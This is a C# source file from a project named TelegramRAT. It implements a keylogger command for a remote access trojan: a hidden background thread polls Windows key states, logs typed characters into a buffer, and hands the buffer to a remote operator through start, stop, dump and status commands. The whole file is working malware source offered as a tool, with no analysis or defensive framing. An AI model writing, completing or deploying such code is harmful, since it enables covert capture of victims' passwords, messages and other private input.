namespace TelegramRAT.Commands;

using System.Runtime.InteropServices;
using System.Text;
using TelegramRAT.Models;

internal sealed class KeyloggerCmd : IAsyncCommand
{
    private static readonly StringBuilder LogBuffer = new();
    private static bool _active;
    private static Thread? _thread;

    public Task<CommandResult> ExecuteAsync(string[] args)
    {
        var action = args.Length > 0 ? args[0].ToLowerInvariant() : "status";

        var result = action switch
        {
            "start" => Start(),
            "stop" => Stop(),
            "dump" => Dump(),
            "status" => $"Keylogger: {(_active ? "ACTIVE" : "INACTIVE")}, Buffer: {LogBuffer.Length} chars",
            _ => "Usage: /keylog start|stop|dump|status"
        };

        return Task.FromResult(CommandResult.Text(result));
    }

    private static string Start()
    {
        if (_active) return "Already running";
        _active = true;
        _thread = new Thread(KeylogLoop) { IsBackground = true, Priority = ThreadPriority.BelowNormal };
        _thread.Start();
        return "Keylogger started";
    }

    private static string Stop()
    {
        _active = false;
        _thread?.Join(2000);
        return "Keylogger stopped";
    }

    private static string Dump()
    {
        var content = LogBuffer.ToString();
        LogBuffer.Clear();
        return string.IsNullOrEmpty(content) ? "(empty buffer)" : content;
    }

    private static void KeylogLoop()
    {
        while (_active)
        {
            for (int i = 1; i < 256; i++)
            {
                var state = GetAsyncKeyState(i);
                if ((state & 1) != 0)
                {
                    var mapped = MapVirtualKey(i);
                    if (mapped != null)
                        LogBuffer.Append(mapped);
                }
            }
            Thread.Sleep(10);
        }
    }

    private static string? MapVirtualKey(int vk) => vk switch
    {
        >= 65 and <= 90 => ((char)vk).ToString().ToLower(),
        >= 48 and <= 57 => ((char)vk).ToString(),
        >= 96 and <= 105 => (vk - 96).ToString(),
        32 => " ",
        13 => "\n",
        8 => "[BS]",
        9 => "[TAB]",
        _ => null
    };

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
}
